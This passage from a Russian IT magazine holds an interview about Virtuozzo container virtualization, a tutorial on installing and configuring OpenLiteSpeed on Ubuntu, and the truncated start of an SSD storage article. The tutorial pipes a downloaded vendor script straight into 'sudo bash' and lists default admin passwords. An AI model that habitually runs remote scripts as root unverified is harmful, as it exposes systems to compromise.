 ступной форме о них немного. Мы решили разобраться, что          Беседовал                                                                                Илья Русанен
 такое Virtuozzo, чем он отличается от Docker, для каких задач         rusanen@glc.ru
 он подходит и, главное, нужен ли он именно тебе или твоей
 компании.

Что такое Virtuozzo
Чем Virtuozzo отличается от Docker? Virtuozzo — это поставщик инфраструк-
 туры. Другими словами — это поставщик виртуальных серверов. Используя
 Virtuozzo, можно создавать контейнер, в котором находится вся ОС. Это было
 предназначением Virtuozzo с самого начала, еще с двухтысячных годов. В вир-
 туальный сервер ставится Apache, Plesk или какая-то другая панель управле-
 ния, и это называется VPS-хостингом.
 Когда мы говорим о Virtuozzo, то речь идет именно о виртуализации. Ког-
да мы говорим о Docker, нужно понимать, что это не средство виртуализа-
ции — это средство доставки приложений. Docker построен на базе runC/
 libcontainer, и основной сценарий использования — быстро доставлять при-
ложение из каталога образов на продакшен-сервер, который может быть фи-
 зическим сервером, персональным компьютером или виртуальным сервером
 в облаке.
 Virtuozzo — это софт, который дает виртуализацию, то есть легковесные
виртуальные машины. Для Docker нет разницы между контейнером с полной
 операционкой, куда можно ставить приложение, и установкой на виртуальную
машину в Amazon, Google Cluster, Azure и так далее. Когда приходит это пони-
 мание, сразу становится видна разница. В одном случае «контейнер» — это
 application container, в другом — системный или ОС-контейнер.
 Virtuozzo поставляет софт для сервис-провайдеров. Скажем, провайде-
ры могут на основе Virtuozzo сделать мини-облако из VPS, и туда можно будет
 ставить Docker. Когда к этим провайдерам с Virtuozzo приходят их конечные
 пользователи и говорят «нам нужен Docker-контейнер», иногда возникает не-
 допонимание. Недавно мы с нашими менеджерами обсуждали, куда встроить
 пользовательский интерфейс для Docker и Kubernetes (это еще одна система
 управления контейнерами). Пришли к выводу, что его нужно встраивать в UI са-
 мообслуживания наших сервис-провайдеров, а не в UI самих сервис-провай-
 деров, отвечающий за управление контейнерами.
 Virtuozzo, в отличие от Docker, можно использовать для «живой» миграции
приложений. Эта функция была с самого создания Virtuozzo, но реализация
 разнилась от версии к версии. До версии Virtuozzo 6 она была реализована
 в ядре. Пару лет назад мы сделали большой патч и предложили его сообще-
 ству Linux kernel, но патч отвергли. Мы, конечно, расстроились, но решили по-
 думать, что можно изобрести вместо этого. В итоге удалось сделать так, что
 потребовалось внести небольшие и приемлемые изменения в ядро, а все
 остальное ушло в user space. Этот проект мы назвали CRIU. Есть сайт, criu.org,
им занимается Павел Емельянов. Именно он изобрел эту технологию выноса
 кода из ядра, и ей сейчас активно пользуются. Она вошла в стандартные дис-
 трибутивы — Red Hat, Ubuntu — и даже в Docker. В Virtuozzo 7 она используется
 как основная технология миграции контейнеров.
 Virtuozzo устанавливается прямо на «голое железо». Мы даем ISO или флеш-
 ку с инсталлятором, как у операционки. Пройдя через слайды инсталлятора,
 на выходе получаешь нашу ОС и систему виртуализации с нашим ядром. Стоит
 признать, что на сегодняшний день наше ядро не так сильно отличается от vanilla
 по сравнению с тем, как это было 5–10 лет назад. Мы принимаем активное уча-
 стие в разработке ядра Linux и по статистике входим в топ-20 или даже топ-10
 по патчам в ядро — в основном в области контейнерной виртуализации. Еще
мы участвуем в разработке эмулятора QEMU и гипервизора KVM.

 Virtuozzo и open source
До сих пор есть вещи, которые мы по той или иной причине не включаем
 в апстрим. Например, улучшения, связанные с производительностью, которые
 позволяют быть на 50% лучше, чем тот же OpenVZ. Мы аккуратно смотрим: если
 в апстриме таких изменений не наблюдается, никто на эту тему не думает, мы их
 оставляем в своем ядре. Это те ценные вещи, которые Virtuozzo приносит своим
 пользователям. Если мы будем всё выкладывать, то за что платить деньги?
Мы выработали стратегию работы с опенсорсом методом проб и ошибок.
Одно время была мысль, что нужно коммитить вообще все, но оказалось, что
 клиенты в таком случае ожидают, что опенсорсный проект должен быть бесплат-
 ным. Пришлось искать некий баланс. Он строится по простому принципу: если
 в апстриме заметна какая-то активность в разработке того, что у нас уже есть,
 значит, пора вливать туда. Потому что нам же потом будет накладно переделы-
 вать свое решение с учетом того, что без нас сделают в апстриме. Но при этом
мы не торопимся делиться своими уникальными решениями — сначала их нуж-
 но монетизировать. В общем, прагматичный подход победил, и противостоять
 этому бесполезно.
Опенсорсный проект OpenVZ появился где-то в районе 2004 года. Сейчас
мы позиционируем его как ядро, поверх которого ставится Virtuozzo. Изначаль-
 но это было сделано для того, чтобы облегчить интеграцию, да и в целом улуч-
 шить восприятие. Когда есть один опенсорсный проект, другой опенсорсный
 проект легче воспринимает то, что ты делаешь, поскольку видит, что все до-
 ступно. В этом была основная цель OpenVZ, которой он успешно достиг.
 Вокруг OpenVZ появилось пользовательское комьюнити, не целое поколе-
 ние, конечно, но достаточное количество сисадминов-фанатов. Выпуская ядра
 в OpenVZ, мы получаем ценную обратную связь: что работает, что не работает.
Люди зачастую присылают нам фиксы или просто указывают на проблемы, по-
 могая нам экономить время разработки.
OpenVZ — это, по сути, базовая версия Virtuozzo. Далеко не все функции,
 которые есть в Virtuozzo, есть в OpenVZ. И мы постоянно работаем над тем, что-
бы эта разница сохранялась и наши же клиенты понимали, что OpenVZ отстает
 от флагмана.

Уникальные черты Virtuozzo
Если говорить о важных вещах, которые есть в Virtuozzo и которых нет
 в OpenVZ, то стоит отметить систему кеширования. Благодаря ей плотность
 серверов Virtuozzo на 30–50% больше. У нас есть полностью проприетарная рас-
 пределенная система хранения данных (Virtuozzo Storage), которая намного луч-
ше по производительности в сравнении с Ceph. Есть такие возможности, как Disk
 Encryption для контейнеров, которые позволяют шифровать диски контейнеров
 ключами конечных пользователей. Установка обновлений без перезагрузки —
 ReadyKernel. Также в Virtuozzo есть поддержка каталогов и образов Bitnami.
Идея Virtuozzo Storage зародилась так: мы провели тур по нашим основным
клиентам и обнаружили, что примерно 33% дискового пространства в их да-
 та-центрах с Virtuozzo ничем не занято. Эти 33% можно продавать, использо-
 вать, как-то монетизировать. Появилась мысль объединить хранилище и отдать
 его в использование под наши контейнеры и виртуальные машины. С техниче-
 ской стороны это подкрепляется тем фактом, что сервис-провайдеры и хостеры
 не стараются сидеть на последнем, наиболее мощном оборудовании. Они ча-
 сто используют старые серверы. И возникла идея сделать хранилище для такого
 оборудования. Если говорить на языке заказчиков, от Ceph оно отличается тем,
 что оно, во-первых, в разы быстрее, во-вторых, это хранилище оптимизировано
 под наши контейнеры и виртуальные машины. Оно идет как компонент Virtuozzo.
 Технология не открытая, и открывать ее мы не планируем.
 Bitnami выпускает в формате Virtuozzo образы для примерно 50 разных
приложений. Когда сервис-провайдер покупает Virtuozzo, у него есть возмож-
 ность оформить платную подписку на них.
У покупателей Virtuozzo есть более-менее стандартный набор приложений,
которые они запаковывают в образы, из которых создаются потом вирту-
альные серверы. Было принято решение договориться с Bitnami о том, что они
 будут поставлять эти образы и обновлять их по мере поступления апдейтов
 от вендоров приложений.
Многим клиентам интересен интерфейс для масс-менеджмента. Если
 есть одна нода, то ей можно управлять с помощью CLI. Но когда появляется
 несколько нод, нужно другое решение. Это хороший повод добавить ценную
вещь для покупателей. Вот пример для живой миграции: есть одна нода с про-
цессором AMD и другая — с Intel. Общий пользовательский интерфейс, кото-
рый работает поверх группы серверов, должен это учитывать и говорить, что
 миграция невозможна, CPU несовместимы при миграции между такими нода-
 ми. Или, к примеру, бэкап-менеджмент. Когда нода одна, достаточно положить
 бэкапы в папочку, и всё. А когда нод несколько, то всё намного сложнее. Мы
 видим, как наши клиенты, у которых по 6000 нод, пытаются организовать это,
 но все равно ничего не получается. Здесь есть возможность вынести эту логику
 и заменить на уровне UI. Это есть в Virtuozzo, но нет в OpenVZ.
Наш гипервизор основан на стандартных для Linux эмуляторе QEMU и ги-
первизоре KVM. До седьмой версии у нас был свой проприетарный гипервизор.
 Кстати, в Parallels Desktop for Mac гипервизор тот же самый, только собранный
 для Mac. Он полностью выполнял свою функцию и был очень хорошим, но мы
 год за годом смотрели на то, что происходит с KVM. Скажем, пять лет назад
было понятно, что мы лучше KVM во многом. А три года назад стало заметно,
 что комьюнити KVM бежит быстрее. Видя, что делает моя команда, в сравнении
 с тем, что делает комьюнити, я отдавал себе отчет, что не получится долго вы-
 жимать из команды больше фич, чем есть в KVM. В какой-то момент, проведя
 исследование, мы поняли, что нам нужно перейти на KVM, но при этом забрать
 с собой те вещи, которые у нас есть и которые отличают нас от того, что есть
 у них в апстриме. В итоге наша система бэкапов и кеширования дает прирост
 производительности 40% и более.
На базе Virtuozzo делаются некоторые решения для DevOps. К примеру,
 Jelastic — мы в партнерстве с его разработчиками выпустили Virtuozzo DevOps.
Чтобы сделать из Virtuozzo такое решение, требуется тот уровень, который
 привнес Jelastic.
 Есть клиенты, которые используют Virtuozzo не только как сервис-провай-
деры, но и в других сценариях. В том числе и очень крупные американские
 компании. Если такому клиенту подходит Virtuozzo, но не хватает каких-то фич,
 они иногда запрашивают их у нас, и мы добавляем. Но основная часть наших
 клиентов — это все же сервис-провайдеры. К примеру, в России Caravan,
 Infobox, Rusonyx работают на Virtuozzo. В США — например, в GoDaddy исполь-
 зуют наши решения.





Алексей Кобец о себе
Мой творческий путь начинался с МФТИ. Я мечтал попасть на факультет аэ-
 ролетательной техники, но, когда я уже подавал документы, мне сказали, что
 это не круто, а крут факультет общей и прикладной физики. Я поступил туда.
До этого у меня даже компьютера не было, встречи с ним случались на за-
 нятиях по информатике. Потом я одним из первых на курсе купил себе ком-
 пьютер, и с того времени появилась тяга к программированию. Тогда мы часто
 ставили VMware, в ней запускали всякие ОС... Через какое-то время это увле-
 чение для меня вылилось в поиск базовой кафедры и научного руководителя,
 чтобы изучать виртуализацию. На горизонте появился Александр Геннадьевич
 Тормасов, он воспитал, наверное, всех топ-менеджеров в компаниях Acronis,
 Virtuozzo, Parallels и так далее. Даже Сергей Белоусов защитил диссертацию
под его руководством. В общем, я пошел к Александру Геннадьевичу практи-
 кантом в SWsoft. Я делал какие-то задания, которые он выдавал, и в какой-то
момент пришло приглашение заняться тестированием в SWsoft, я согласился.
По тем временам это были хорошие деньги, хорошая подработка на лето. Мы
 начали писать систему автотестов для ядра Virtuozzo. Вот так все и начиналось.
Это было лето 2000 или 2001 года, приблизительно мой третий курс.
Программировать я начал с Shell и Perl. На них тогда писались тесты. Но при-
 ходилось писать на C и C++. Было подозрение, что ядро Linux падает, когда от-
 крывается огромное количество TCP-сокетов и по ним гоняются данные. Мои
 начальники поспорили, напишем ли мы такой тест, который уронит ядро в oops,
 или не напишем. Я на это потратил, наверное, месяц. Но отлаживал и запускал
 на системе с одним процессором. Я уже был готов сдаться, но в последний мо-
 мент взял другой сервер SMP и запустил — система мгновенно упала.

Как начинался Virtuozzo
Главной идеей Virtuozzo было создать раздельные среды для хостеров. Им
 нужно иметь раздельный биллинг и быть изолированными друг от друга таким
 образом, чтобы не было проблем с распределением ресурсов. Изолировать,
 естественно, нужно было и от хоста, чтобы не оставлять возможность проникно-
 вения. Эту задачу поручили спроектировать Александру Геннадьевичу, и на вы-
 ходе как раз получилась технология, которую мы называли по-разному: virtual
 environments, контейнеры. Это и легло в основу Virtuozzo и OpenVZ. Во всех
 патентах мы описываем именно эту технологию.
Когда я пришел в компанию в 1999 или 2000 году, работа над виртуальны-
ми окружениями уже велась. Сейчас, спустя довольно много лет, понятно, что
 нет такого плана, который сразу гарантировал бы успех. Методом проб и оши-
 бок мы искали, где можно применить нашу технологию. В то время был бум
 веб-сайтов, все делали сайты, всем хотелось где-то их хостить. Было понятно,
 что виртуальные машины — это для сайтов слишком жирные сущности. Мож-
 но изолировать на уровне процессов, но этого все равно недостаточно. Одно
время мы делали что-то вроде cgroups на стероидах, но в итоге пошли по пути
 дополнения изоляции файловой системы и сетевой изоляции.
Существовала версия Virtuozzo для FreeBSD, но она не была выпущена, по-
тому что доминирует Linux. Есть версия для Windows — это один из проектов,
 над которым мне посчастливилось работать.

О безопасности
У нас ни разу не было случаев эксплуатации уязвимости изнутри виртуаль-
ной машины. Такие вещи всплывают очень редко, и те, кто о них знает, на-
 верное, хранят их в тайне. Мы очень серьезно к этому относимся. К примеру,
кроме внутреннего секьюрити-аудита (у нас есть целая секьюрити-команда, ко-
 торая этим занимается), мы еще нанимаем и работаем с компанией Openwall.
Мы проводим секьюрити-ревью каждой большой версии. Недавно закончили
ревью Virtuozzo 7. Ничего такого, что открыло бы путь для эскейпа, не нашли,
 но есть небольшие ошибки, которые мы исправляем. Мы очень внимательно
следим за секьюрити. Например, когда выходят ядра Red Hat, мы смотрим, что
 там произошло, и порой даже что-то чиним и отсылаем в Red Hat. Периоди-
 чески Red Hat нас благодарит. А иногда мы выпускаем свое ядро раньше, чем
 появляется Red Hat с фиксом.
У Virtuozzo есть программа вроде bug bounty, но попроще. Есть почта
 security@virtuozzo.com, куда приходят письма с баг-репортами. Мы их класси-
фицируем и, если подтвердим наличие серьезной уязвимости, вознаграждаем
 таких людей. Такое бывает нечасто, но мы честно платим.

Кого берут в Virtuozzo
Мы работаем с несколькими вузами, есть студенческие программы и ин-
 тернатура. Начинающим можно прийти туда. Студенты, к примеру, занимают-
 ся CRIU. Через один-два года стажировки студенты приходят к нам на полный
 рабочий день и подключаются к серьезным разработкам. Если посмотреть
 на команду, у нас достаточно большое число людей прошли такой путь, начи-
 ная с меня самого.
Если высшего образования нет, но есть интересные разработки, мы по-
смотрим, поговорим с вами и, возможно, возьмем. В первую очередь нужно
 разбираться в ядре. Если ты успел засветиться в сообществе и занимаешься
вещами, связанными с производительностью, с разработкой гостевых драй-
 веров, с разработкой систем виртуализации, мы, конечно же, обратим на тебя
 внимание.
Разработчикам ядра нужно знать C, а пользовательский интерфейс мы пи-
шем на Go. Но для тех, у кого есть глубокие знания программирования, язык
 уже не так важен. Я сам пришел в компанию, не зная ни C, ни C++ и не имея
 опыта. Я знал Perl и Shell, но в итоге разобрался. Главное — чтобы человек был
 способен к развитию и увлечен.
SYNACK
 БЫСТРЫЙ
И СВОБОДНЫЙ





     РАЗБИРАЕМСЯ С ВЕБ-СЕРВЕРОМ
            OPENLITESPEED




Ограниченность ресурсов VDS приводит
к тому, что, когда нагрузка резко возраста-
ет, приходится менять хостера или тариф-
ный план на более высокий либо пробовать              «urban.prankster»Мартин
выжать максимум из текущего сервера, оп-          prank.urban@gmail.comПранкевич
тимизировав установки и состав ПО. На слу-
ху разные варианты: перейти с Apache
на nginx, использовать связку nginx + Apache, установить
кеширующий сервер Varnish. Но забывают о веб-сервере
OpenLiteSpeed, который достоин внимания благодаря вы-
сокой производительности и низкому потреблению памяти.

Возможности OpenLiteSpeed
В середине 2013 года LiteSpeed Technologies, производитель проприетарного
HTTP-сервера LiteSpeed, занимающего четвертое место по популярности (по
статистике W3Techs), открыла код своего проекта под именем OpenLiteSpeed,
сделав доступной бесплатно базовую функциональность. Со временем список
функций расширился, а высокая производительность и низкое потребление
памяти привлекли внимание пользователей. Особо хотелось бы отметить на-
личие веб-панели для настройки параметров и просмотра статистики. Многие
пользователи с небольшим опытом администрирования для удобной настрой-
ки веб-сервера ставят хост-панели, нередко ограничивающие их в дальней-
ших возможностях ручной донастройки. Здесь же такой необходимости нет.
Все уже идет в комплекте. Правда, есть и минус — отсутствие локализации.
  В Сети можно найти большое количество тестов. При отдаче статики
OpenLiteSpeed опережает по производительности Apache в несколько раз,
а при выполнении PHP-скриптов выигрыш в скорости составляет до 50%.
По сравнению с nginx OLS имеет аналогичные, если не лучшие показатели
при выдаче статического контента. Здесь все зависит от конкретных настроек.
По крайней мере, из коробки OLS обычно обходит стандартные установки nginx
из дистрибутивных пакетов. Но OLS однозначно обыгрывает связку nginx +
PHP-FPM. Специально разработанный для этого сервера PHP LSAPI (LiteSpeed
Server Application Programming Interface) лучше масштабируется при более вы-
соких нагрузках, чем PHP-FPM. По тестам разработчиков OLS обходит пример-
но на 20% FastCGI, на 50% — mod_php и на 75% связку nginx + PHP-FPM. Из ко-
робки поддерживается запуск приложений на языках Python, Perl и Java.
   Как и в nginx, в OLS архитектура событийно ориентированная, поддержи-
вающая мультиплексирование соединений при помощи epoll (Linux), kqueue
(FreeBSD, macOS) и /dev/poll (Solaris). Внешние приложения и дополнения
запускаются как отдельные процессы, что позволяет разгрузить основной
серверный процесс и увеличить эффективность обработки одновременных
соединений. Обработка CGI-скриптов производится отдельным фоновым
процессом. Поддерживает HTTP/2.
   Реализованы различные функции, позволяющие создавать безопасные
среды: suEXEC (выполнение скриптов с правами текущего пользователя),
chroot, ограничение трафика и интенсивности запросов, правила на основе
содержимого Referer, механизмы Accept-filter и sendfile. Есть и специфиче-
ские установки. Например, LSAPI для suEXEC PHP предлагает три варианта
использования: Daemon (скорость, кеширование, эффективное использова-
ние ресурсов), Worker (для узлов с ограниченными ресурсами) и ProcessGroup
(скорость Daemon и настройки Worker). Есть возможность быстрой настройки
и перестройки виртуальных хостов при помощи шаблонов.
  Сервер поддерживает совместимые с mod_rewrite правила перезаписи за-
просов и SSI-вставки в стиле Apache, определение местоположения с GeoIP,
сжатие контента (Gzip), возможность отдачи потокового медиаконтента (MP4
и F4V) и многое другое. В ранних версиях сервера по умолчанию использова-
лись конфигурационные файлы в формате XML, но можно было переключать-
ся на текстовый (скрипт /usr/local/lsws/conf/switch_config.sh). C версии
1.4 поддерживается только текстовый формат (как по мне, он более нагляд-
ный). При апгрейде все конфигурационные файлы автоматически преобразу-
ются в текстовый формат; при необходимости даунгрейда на ранние версии
сервера, для конвертации настроек в XML, разработчики приготовили скрипт
/usr/local/lsws/backup/recover_xml.sh.  Предусмотрена  возможность
применения новой конфигурации или обновления сервера без разрыва сое-
динений (режим graceful).
   Поддерживается два вида виртуального хостинга: IP-based и Name-based.
Первый вариант реализуется за счет отдельных Listener, и такой виртуальный
хост имеет свой собственный IP-адрес или порт. Доступна такая возможность,
как Binding, позволяющая привязать отдельный Listener к lshttpd, который,
в свою очередь, будет фактически привязан к своему CPU.
   OpenLiteSpeed может быть установлен в качестве прозрачного обратного
прокси-сервера к веб-серверу или серверу приложений, поддерживающему
HTTP.
  В коммерческой версии LSWS доступны: поддержка mod_security, воз-
можность считывания конфигураций Apache, совместимость с панелями
управления хостингом, поддержка mod_security, возможность использова-
ния .htaccess, кеширование контента на диске, поддержка chroot и некоторые
другие функции. В общем, как видим, OLS здесь не сильно проигрывает nginx
и не совсем подходит для организации хостинга. Зато отлично вписывается
в небольшие и средние проекты и особенно удобен, когда на одном сервере
нужно размещать большое количество своих сайтов. Также компания разра-
батывает различные кеширующие плагины для некоторых CMS, совместимые
с LSWS. Например, для WordPress.
   Здесь бы хотелось сделать уточнение, чтобы не было путаницы. В OLS
не поддерживаются файлы .htaccess, но вот сами правила rewrite можно пе-
ренести в настройки виртуального хоста в оригинальном виде. Также формат
журнала изначально совместим с Apache, поэтому без дополнительных на-
строек будут работать все анализаторы логов, включая fail2ban. То есть с OLS
меньше возни, чем при переходе с Apache на nginx. Это большой плюс.

Установка OpenLiteSpeed в Ubuntu
Проект предоставляет репозитории для CentOS 5/6/7, Debian 7/8 и Ubuntu
12/14/16. Остальные можно установить при помощи исходных текстов. На сай-
те есть инструкция, это в общем не очень запутанно. В Ubuntu процесс такой:

$ wget -O - http://rpms.litespeedtech.com/debian/
    enable_lst_debain_repo.sh | sudo bash
$ sudo apt install openlitespeed

В /usr/local/lsws будет создана структура каталогов с настройками, шаблона-
ми и исполняемыми файлами. Проверяем:

$ /usr/local/lsws/bin/lshttpd -v
LiteSpeed/1.4.23 Open

Теперь PHP. В репозитории имеется несколько версий от PHP 5.4 до послед-
ней, 7-й. Смотрим список:

$ sudo apt search lsphp

Поставим для примера PHP 5.6. Для упрощения выберем все модули:

$ sudo apt install lsphp56-*

Проверяем, чтобы в /usr/local/lsws/fcgi-bin был файл или ссылка lsphp. Если
нет, создаем вручную.

$ sudo ln -sf /usr/local/lsws/lsphp56/bin/lsphp /usr/local/
    lsws/fcgi-bin/lsphp5

Для управления стартом используется утилита lswsctrl. Все параметры можно
узнать, введя

$ /usr/local/lsws/bin/lswsctrl help

Стартуем:

$ sudo /usr/local/lsws/bin/lswsctrl start

При установке из пакетов доступен init-скрипт, поэтому в обычной эксплуата-
ции следует использовать его.

$ sudo service lsws start

По умолчанию сервер запускается с правами nobody:nogroup, веб-админ-
ка — lsadm/lsadm. В зависимости от установок сервера их, вероятно, потре-
буется изменить. Также следует проверить права доступа веб-сервера к ката-
логу временных файлов. По умолчанию это /tmp/lshttpd/swap, изменить его
можно, переопределив переменную swappingDir в конфигурационном файле.

Знакомимся ближе
Если ввести netstat -an, то увидим, что открыты порты 8088 и 7080. Первый —
это вход на рабочую страницу веб-сервера, в данный момент там установ-
лена заглушка в виде страницы приветствия. Следует начать с нее — http://
localhost:8088. Кроме сообщения об успешности установки, эта страница со-
держит множество ссылок, позволяющих протестировать правильность ра-
боты основных функций: CGI, PHP, страница ошибок 404, аутентификация,
загрузка файлов, документация и другое. Желательно обойти все пункты и по-
смотреть, что все работает. Если что-то выдает ошибку, обращаемся к журна-
лу /usr/local/lsws/logs/error.log.
   Конфигурационный файл OLS — httpd_config.conf — размещен в /usr/
local/lsws/conf, здесь же есть готовые шаблоны файла под разные задачи.
Он в целом стандартный, разделен на секции, и назначение большинства па-
раметров тем, кто хоть раз настраивал веб-сервер, должно быть ясно без до-
кументации. Например, в expires настраивается кеширование, в tuning опти-
мизируется работа сервера, в accessDenyDir указываются каталоги, доступ
к которым запрещен, virtualHost — настройка виртуальных узлов и так далее.
Обработчик PHP подключается в секции extProcessor lsphp5:





Аналогично подключаются обработчики на Ruby, Perl и другие. В параметрах
виртуального хоста задается корневой каталог и конфигурационный файл, со-
держащий специфические настройки:





Теперь правила rewrite. Здесь также ничего сложного:





Базовых параметров не очень много, поэтому, чтобы запустить сайт, потребу-
ется минимум времени. Группа каталогов представляет собой так называемый
контекст (context), к которому могут быть применены определенные правила.
Контекст может быть десяти типов: статический, прокси, LoadBalance, LSAPI,
Java... Но фишка OLS — это все-таки веб-панель.

Приступаем к настройке в веб-панели
OpenLiteSpeed — веб-сервер, которым обычно управляют через администра-
тивный интерфейс, он удобен и понятен, содержит большое число полез-
ных возможностей. Поэтому стоит познакомиться с некоторыми из них. Идем
в админку https://localhost:7080. По умолчанию для входа используется
логин admin и пароль 123456, их впоследствии обязательно меняем в WebAdmin
Setting   General    Users. В поставке также есть специальный скрипт /usr/
local/lsws/admin/misc/admpass.sh, позволяющий изменить пароль из кон-
соли: его можно использовать, если пароль забыли и его нужно сбросить.
   После входа попадаем в панель статистики Dashboard, дающую полное
представление о текущей работе OLS так сказать из коробки, без установки
дополнительных модулей server-status, как в Apache. Здесь видим общую за-
грузку системы, веб-трафик и количество запросов на сервер, отдельные дан-
ные по Listener и виртуальным узлам. Нужные графики легко подключаются
установкой чекера, есть режим отображения в реальном времени. Здесь же
выводятся логи ошибок с возможностью отбора результата при помощи филь-
тров. Отдельно включается режим отладки и переход на рабочие журналы
(Tools   Server Log Viewer). Здесь же можно быстро остановить виртуальный
узел. Для этого следует лишь нажать кнопку в Virtual Host    Actions. Хотелось
бы обратить внимание на ссылку Maсhine вверху слева. При ее нажатии откро-
ются четыре кнопки, позволяющие перезагрузить настройки в Graceful-режи-
ме, получить доступ к логам и статистике.





                         Вывод графиков в панели администратора OpenLiteSpeed


Теперь можно приступать к настройкам. Порт по умолчанию 8088 выбран,
очевидно, для демоцелей и чтобы не было конфликтов при установке во
время смены сервера, но он не очень удобен для посетителей. Сменим его
на стандартный 80-й. Переходим в Listeners, выбираем в списке прослушива-
тель Default, нажимаем на название или кнопку View/Edit. На экране в Address
Settings в трех вкладках General/SSL/Modules будет выведен список параме-
тров. Еще важная особенность. К Listener в Virtual Host Mappings можно привя-
зать определенные домены.





                                                           Настройка Listener


Это позволяет очень просто настроить сервер для выдачи строго определен-
ных доменов по разным IP, портам и с использованием SSL или без защиты.
   Для изменения параметров следует нажать ссылку Edit, расположенную
в правой части поля Address Settings. Меняем порт. В появившемся окне указы-
ваем порт 80 вместо 8088. При необходимости привязываем Listener к опре-
деленному IP и процессу (Binding). Если планируется использование HTTPS,
то следует отметить Secure, сохранить результат и во вкладке SSL таким же
образом указать сертификаты (их нужно будет сгенерировать самостоятель-
но или получить). Далее перечитываем настройки Maсhine   Graceful Restart.
Теперь стандартная страница будет доступна на 80-м порту. Порт для админки
перестраивается в WebAdmin Settings   Listeners.
   Страница Server Configuration позволяет настроить все параметры httpd_
config.conf в удобном виде. Здесь восемь основных секций (General, Log,
Tuning, Security, External App, Script Handler, Rack/Rails и Modules), каждая
из которых может содержать подпункты. Особо расписывать нечего, настроек
много, везде доступно краткое описание, некоторые значения устанавливают-
ся при помощи чекбокса или выбираются из списка.
  В поставке идет несколько модулей, все они находятся в /usr/local/
lsws/modules; кроме этого, можно установить ряд модулей сторонних разра-
ботчиков. Чтобы они были доступны Listener и виртуальным узлам, сами моду-
ли и параметры по умолчанию следует прописать во вкладке Modules, указав
имя (без расширения) и заполнив поле Module Parameters (обычно берется
в документации). После настроек потребуется перезапустить OLS. В после-
дующем в настройках Listener и виртуальных узлов модуль просто выбирается
из списка, а установленные параметры можно переопределять.





                       Настройки основных параметров OpenLiteSpeed в веб-панели


В репозитории проекта доступны разные версии lsphp, но иногда их параме-
тры или номер релиза могут не подходить требованиям конкретного прило-
жения. Веб-панель позволяет легко собрать оптимизированную версию PHP
под свои нужды. Для этого нужно перейти в Tools   Compile PHP и следовать
указаниям программы: выбираем версию, параметры и так далее. Затем на-
стройки обработчика нужно указать в параметрах виртуального узла.





               OpenLiteSpeed предоставляет возможность сборки PHP из админ-панели


Виртуальные узлы
Интерфейс администратора позволяет создавать виртуальные узлы. Причем
OLS предлагает сразу два способа: ручной и при помощи шаблонов. Един-
ственный важный момент: все файлы и каталоги, необходимые для работы
виртуального узла, следует подготовить заранее. Исключение лишь конфи-
гурационный файл. Нужно просто указать в настройках его имя, и если файл
есть (например, взят с подобного узла), то установщик проверит возможность
его редактирования, если нет, то при сохранении появится запрос на его со-
здание и будет создан файл с базовыми (почти пустыми) настройками. Про-
ще поначалу скопировать шаблоны и файлы тестового сайта Example в новое
место и затем указать пути (абсолютные или относительно $SERVER_ROOT)
в веб-панели.

$ /usr/local/lsws
$ sudo cp -vR Example Example1

Конфигурационный файл должен находиться в $SERVER_ROOT/conf/vhosts
или $SERVER_ROOT/conf/vhosts/$VH_NAME/vhconf.conf ($VH_NAME соответ-
ствует имени виртуального узла).

$ sudo mkdir conf/vhosts/Example1
$ sudo chown lsadm:lsadm conf/vhosts/Example1

Настроек много. Задаются параметры вплоть до ограничения статических/
динамических запросов с одного IP и полосы пропускания. Если возникнут
проблемы, при сохранении мастер выдаст подсказку. Далее устанавливаем
Document Root, имя домена, алиасы и прочие параметры. Сохраняем настрой-
ки и привязываем к виртуальному хосту нужный Listener. Переходим в Listeners,
выбираем Add, чтобы добавить новый Listener, или переходим в Default
Virtual Host Mappings, где прописываем новый узел, введя название виртуаль-
ного хоста и домена. По окончании перезапускаем сервер.





                                                    Создаем виртуальный хост


Второй способ интересней, так как позволяет создавать узлы на основании
готового шаблона и перестраивать впоследствии все виртуальные узлы с од-
ного места. Шаблон по сути — это скелет для сайта плюс конфигурационный
файл и Listener. Если необходимо что-то поменять в настройках всех узлов, до-
статочно будет просто изменить шаблон, после чего изменение распростра-
нится на связанные узлы. Появляются новые задачи — просто создаем новый
шаблон и подключаем к нему узлы. Созданные ранее виртуальные узлы можно
подключить к шаблону, как и, наоборот, нажав ссылку Instantiate, можно «от-
ключить» виртуальный узел от шаблона и пустить в свободное плаванье.
  По умолчанию в VHost Templates находится три шаблона: centralConfigLog,
PHP_SuEXEC и EasyRailsWithSuEXEC. Сами файлы расположены в conf/
templates, чтобы создать новый, можно скопировать и изменить имею-
щийся. Также проект предлагает готовые шаблоны, правда пока они в ста-
ром XML-формате. После копирования файла в conf/templates переходим
в VHost Templates, нажимаем Add и прописываем название и путь к файлу.
   Теперь создаем виртуальный узел из шаблона, выбираем шаблон и в поле
Member Virtual Hosts нажимаем Add, после чего вводим название узла, имя
домена и алиас. После сохранения он появится в списке Member Virtual Hosts
и во вкладке Virtual Hosts, где будет дополнительно отмечен значком, поясня-
ющим, с какого шаблона он установлен.





                                            Шаблон VHost в OpenLiteSpeed

Заключение
После всех настроек веб-сервер OpenLiteSpeed установлен на сервер и готов
к работе. Несмотря на то что написано много, он очень прост для небольших
проектов и гибок для сложных конфигураций.
SYNACK
ПЕРЕХОДИМ НА SSD:
НАШ СУБЪЕКТИВНЫЙ ОПЫТ





 КАК МЫ СТРОИЛИ СИСТЕМУ ХРАНЕНИЯ
ДАННЫХ В ВИРТУАЛИЗИРОВАННОЙ СРЕДЕ



 Несколько лет назад начался переход
 от colocation к облачной модели ИТ-серви-
 сов. Запросы рынка к облачным сервисам
 оказали существенное влияние на разви-                                                                               Илья Вислоцкий
 тие систем хранения данных и требования,        архитектурыдиректорклиентскихцентра
                                                                                   решений Stack Group
 предъявляемые к их производительности.

ВЫБОР СХД ДЛЯ КОРПОРАТИВНОГО ОБЛАКА
 При использовании виртуализации для корпоративного облака нагрузка
 со стороны виртуальной инфраструктуры на систему хранения произвольная.
 Разные приложения одновременно обращаются к СХД с разным профилем
 нагрузки — распределение ее невозможно спрогнозировать. При этом долж-
 ны соблюдаться жесткие требования к количеству операций ввода-вывода
 (IOPS) и времени отклика (latency).
   Под такой тип нагрузки лучше всего подходят систе-
 мы хранения данных, построенные на базе твердотельных
 накопителей (SSD). Но еще несколько лет назад емкость
 SSD-накопителей была небольшой, а цена — очень высо-
 кой, что ощутимо влияло на конечную стоимость сервиса.
   Чтобы найти баланс между высокой производительно-
 стью и большим объемом невостребованного дискового    WARNING
 пространства, в виртуальном дата-центре можно исполь-
                                                                              Поскольку цель этой
 зовать SSD-кеш на всех системах хранения (в пределах                                                                                     статьи — описать
